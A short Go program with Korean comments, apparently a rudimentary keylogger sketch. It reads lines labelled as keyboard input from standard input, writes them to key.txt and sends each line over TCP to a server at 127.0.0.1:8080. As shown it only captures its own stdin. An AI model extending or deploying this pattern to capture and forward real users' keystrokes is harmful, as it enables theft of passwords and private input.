package main

import (
    "bufio"
    "fmt"
    "log"
    "net"
    "os"
)

func main() {
    // key.txt 파일을 쓰기 모드로 열기
    f, err := os.OpenFile("key.txt", os.O_WRONLY|os.O_CREATE, 0644)
    if err != nil {
        log.Fatal(err)
    }
    defer f.Close()

    // 서버에 접속하기 위한 소켓 생성
    conn, err := net.Dial("tcp", "127.0.0.1:8080")
    if err != nil {
        log.Fatal(err)
    }
    defer conn.Close()

    // 키보드 입력을 무한 루프로 읽기
    scanner := bufio.NewScanner(os.Stdin)
    for scanner.Scan() {
        // 키보드로부터 입력을 읽고 key.txt 파일에 출력
        f.Write(scanner.Bytes())
        f.Sync()

        // 서버에 키보드 입력을 전송
        fmt.Fprintln(conn, scanner.Text())
    }
    if err := scanner.Err(); err != nil {
        log.Fatal(err)
    }
}
